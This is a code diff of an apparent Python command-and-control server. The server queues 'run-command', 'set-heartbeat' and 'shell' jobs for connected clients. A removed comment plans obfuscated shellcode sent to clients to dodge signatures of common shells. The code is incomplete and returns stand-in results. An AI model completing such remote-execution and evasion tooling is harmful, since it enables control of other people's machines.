@@ -309,36 +309,35 @@ class s_friendlyclient:
             print("Client not found... ")
             ##exit protocol
             #self.exit_protocol()
-        
+
+        # == Static, From Server, validated
         if client_command == "get-data":
             data = f"{self.client.data_list}"
             self.send_msg(data)
-            
-        elif client_command == "get-jobs":
-            pass
-            #self.client.
-
-            #self.send_msg(server_supported_jobs)
-            
-            ##get jobs for/from clients
-
+        
+        
+        # == Dynamic, To Client, validated
         elif client_command == "set-heartbeat":
-            heartbeat = client_command_value
+            heartbeat_value = client_command_value
             print(heartbeat)
             
             
-            self.client.interact("set-heartbeat", heartbeat)
+            self.client.interact("set-heartbeat", heartbeat_value)
             
             ## sanity check
-            if self.client.current_job == f"set-heartbeat\\|/{heartbeat}":
-                self.send_msg(f"Heartbeat queued to be set to: {heartbeat}\nuse 'get-data' to verify the change\nDevNote: Need to make sure this actually works.Not sure how self.heartbeat gets it value - I forogr")
+            if self.client.current_job == f"set-heartbeat\\|/{heartbeat_value}":
+                self.send_msg(f"Heartbeat queued to be set to: {heartbeat_value}\nuse 'get-data' to verify the change\nDevNote: Need to make sure this actually works.Not sure how self.heartbeat gets it value - I forogr")
             
             else:
                 self.send_msg("Error setting heartbeat")
 
+
+        # == Dynamic, To Client
         elif client_command == "run-command":
-            data = "runcommand"
-            self.send_msg(data)
+            command_value = client_command_value
+
+            ## Sending back results of command run
+            self.send_msg(self.client.interact("run-command", command_value))
         
         #else:
             #self.send_msg(self.InputNotUnderstood)
@@ -516,15 +515,11 @@ class s_perclient:
             )
 
         elif user_input == "run-command":
-            command = input("Enter command: ")
-            self.current_job = f"run-command\\|/{command}"
-            #self.current_job = "wait"
+            #command = input("Enter command: ")
+            self.current_job = f"run-command\\|/{command_value}"
+            #return results of that job
+            return f"standin-command-results, command run: {command_value}"
             
-        ## Idea for shell, have all the code on this side. That way, you just pass the string/command in, and 
-        ## can have it obsfucated. The client will then execute said code. This may also help with signatures of common
-        ## shells if embedded in the client code
-        
-        ## How it may work: Shell job gets sent, then the client listens for a followup string, which is the shellcode being sent
         elif user_input == "shell":
             self.current_job = "shell\\|/shell"
         
